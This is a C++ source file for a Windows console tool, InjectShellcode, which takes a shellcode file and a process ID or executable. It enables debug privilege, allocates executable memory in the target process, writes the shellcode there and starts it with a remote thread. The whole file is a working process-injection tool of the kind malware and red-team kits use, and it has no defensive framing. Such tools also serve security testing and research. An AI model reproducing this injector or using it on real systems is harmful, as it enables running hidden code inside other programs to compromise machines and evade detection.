// InjectShellcode.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>
#include <tchar.h>
#include <stdio.h>
#include <strsafe.h>

#define BUFFERSIZE 1024

void DisplayError(LPTSTR lpszFunction)
{
    LPVOID lpMsgBuf;
    LPVOID lpDisplayBuf;
    DWORD dw = GetLastError();

    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        dw,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR)&lpMsgBuf,
        0,
        NULL);

    lpDisplayBuf =
        (LPVOID)LocalAlloc(LMEM_ZEROINIT,
            (lstrlen((LPCTSTR)lpMsgBuf)
                + lstrlen((LPCTSTR)lpszFunction)
                + 40) // account for format string
            * sizeof(TCHAR));

    if (FAILED(StringCchPrintf((LPTSTR)lpDisplayBuf,
        LocalSize(lpDisplayBuf) / sizeof(TCHAR),
        TEXT("%s failed with error code %d as follows:\n%s"),
        lpszFunction,
        dw,
        lpMsgBuf)))
    {
        printf("FATAL ERROR: Unable to output error code.\n");
    }

    _tprintf(TEXT("ERROR: %s\n"), (LPCTSTR)lpDisplayBuf);

    LocalFree(lpMsgBuf);
    LocalFree(lpDisplayBuf);
}

int wmain(int argc, WCHAR *argv[])
{
    if (argc < 3)
    {
        printf("Usage: %s <shellcode file> <pid|executable>", argv[0]);
        exit(0);
    }

    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp = { 0 };
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid))
        {
            AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
        }

        CloseHandle(hToken);
    }

    DWORD dwProcessId = _wtoi(argv[2]);
    HANDLE hProcess;

    if (dwProcessId > 0)
    {
        printf("Opening process id: %d\n", dwProcessId);
        hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
    }
    else
    {
        STARTUPINFO si;
        PROCESS_INFORMATION pi;

        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));

        // Start the child process. 
        if (!CreateProcess(NULL,   // No module name (use command line)
            argv[2],        // Command line
            NULL,           // Process handle not inheritable
            NULL,           // Thread handle not inheritable
            FALSE,          // Set handle inheritance to FALSE
            CREATE_SUSPENDED,              // No creation flags
            NULL,           // Use parent's environment block
            NULL,           // Use parent's starting directory 
            &si,            // Pointer to STARTUPINFO structure
            &pi)           // Pointer to PROCESS_INFORMATION structure
            )
        {
            printf("CreateProcess failed (%d).\n", GetLastError());
            return -1;
        }

        hProcess = pi.hProcess;
        ResumeThread(pi.hThread);
    }

    if (hProcess == INVALID_HANDLE_VALUE)
    {
        return -1;
    }

    Sleep(1000);

    printf("Opening %S\n", argv[1]);
    HANDLE hFile = CreateFile(argv[1],               // file to open
        GENERIC_READ,          // open for reading
        FILE_SHARE_READ,       // share for reading
        NULL,                  // default security
        OPEN_EXISTING,         // existing file only
        FILE_ATTRIBUTE_NORMAL, // normal file
        NULL);                 // no attr. template

    if (hFile == INVALID_HANDLE_VALUE)
    {
        DisplayError(TEXT("CreateFile"));
        _tprintf(TEXT("Terminal failure: unable to open file \"%s\" for read.\n"), argv[1]);
        return -1;
    }

    LARGE_INTEGER FileSize;
    GetFileSizeEx(hFile, &FileSize);

    DWORD shellcodeSize = FileSize.LowPart;

    BYTE *pRWX = reinterpret_cast<BYTE*>(VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE));

    if (!pRWX)
    {
        printf("Failed to allocate %d\n", shellcodeSize);
        return -1;
    }

    printf("Allocated %d bytes at @%p\n", shellcodeSize, pRWX);

    DWORD readBytes;
    DWORD Offset = 0;
    char ReadBuffer[BUFFERSIZE] = { 0 };
    while (ReadFile(hFile, ReadBuffer, BUFFERSIZE - 1, &readBytes, NULL) == TRUE && readBytes>0)
    {
        printf("Read %d bytes\n", readBytes);
        WriteProcessMemory(hProcess, pRWX+ Offset, reinterpret_cast<BYTE*>(ReadBuffer), readBytes, nullptr);
        Offset += readBytes;
    }

    DWORD dwThreadId = 0;
    CreateRemoteThread(hProcess, NULL, 1024 * 1024, reinterpret_cast<LPTHREAD_START_ROUTINE>(pRWX), nullptr, (DWORD)NULL, &dwThreadId);
    printf("Created thread at @%p (ThreadID=%d)\n", pRWX, dwThreadId);
    return 0;
}
